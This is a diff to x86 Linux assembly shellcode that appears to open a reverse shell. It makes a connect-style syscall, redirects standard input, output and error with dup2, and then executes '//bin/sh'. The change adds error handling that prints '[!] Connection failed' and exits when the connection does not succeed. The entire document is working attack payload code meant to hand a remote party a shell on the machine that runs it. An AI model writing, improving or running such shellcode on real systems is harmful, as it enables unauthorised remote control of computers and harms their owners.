@@ -37,6 +37,9 @@ _start:
 	lea ecx, [esp]
 	int 0x80
 
+	test eax, eax	 ; check if eax is 0
+	jnz failed	 ; display error and exit
+
 	; dup2
 	mov ecx, edx
 	mov cl, 0x2 	 ; start from fd = 2 (stderr) and go down to 0
@@ -58,5 +61,24 @@ dup2:	mov al, 0x3F	 ; dup2
 	lea ecx, [esp]	 ; argp = { "//bin/sh\0", NULL }
 	mov ebx, ebp     ; //bin/sh\0
 	mov al, 0x0b     ; execve
+	int 0x80
+
+failed:	xor eax, eax
+	mov al, 0x4	 ; write
+	mov bl, 0x2	 ; stderr
+
+	push word 0x0a64
+	push 0x656c6961
+	push 0x66206e6f
+	push 0x69746365
+	push 0x6e6e6f43
+	push 0x205d215b
+
+	lea ecx, [esp]
+	mov dl, 0x16
+	int 0x80
+
+	mov al, 0x1
+	mov bl, 0x1
 	int 0x80
 
